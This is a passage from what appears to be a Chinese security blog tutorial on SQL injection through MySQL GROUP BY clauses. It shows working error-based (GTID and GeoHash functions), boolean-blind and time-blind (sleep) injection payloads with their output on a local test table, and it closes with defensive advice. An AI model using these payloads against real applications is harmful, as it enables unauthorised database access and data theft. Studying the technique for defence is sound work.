+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740307.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740307.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740307.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740307.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 436;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w"> </span><span class="err">失败</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="n">ST_LongFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+--------+------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740592.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740592.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740592.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740592.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 722;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="gtid报错" class="heading-element"><span>GTID报错</span>
+  <a href="#gtid%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>mysql 5.7.26上成功了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,(</span><span class="n">gtid_subtract</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,(</span><span class="n">gtid_subset</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="p">.</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740359.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740359.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740359.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740359.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 127;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740297.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740297.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740297.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740297.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 297;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>mysql 8.0.31失败</p>
+<h3 id="布尔盲注" class="heading-element"><span>布尔盲注</span>
+  <a href="#%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>布尔盲注这块，没想到其他办法，一种是利用union select</p>
+<p>另一种是利用order by 的布尔盲注实现。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">rand</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740985.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740985.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740985.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740985.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 501;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>因为group by后面可以接order by，所以适用于order by注入点的方法都可以用。</p>
+<h3 id="时间盲注" class="heading-element"><span>时间盲注</span>
+  <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>时间盲注想到的办法也是union select 和 order by，但是需要注意的是 order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740643.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740643.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740643.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740643.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 562;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>所以这种方法不推荐使用，尤其是查询大型数据库。</p>
+<h2 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>要防止SQL注入攻击，建议采取以下措施：</p>
+<ol>
+<li>使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。</li>
+<li>输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。</li>
+<li>最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。</li>
+</ol>
+<p>对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。</p>
+<p>以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。</p>
+<p>微信扫一扫，关注该公众号</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode" alt="img" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode?size=large 2x" data-title="img" class="suffix-invalid suffix-invalid__small suffix-invalid__large" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-07-27 09:30:40">更新于 2023-07-27&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sqli/" class="post-tag" title="标签 - SQLi">SQLi</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
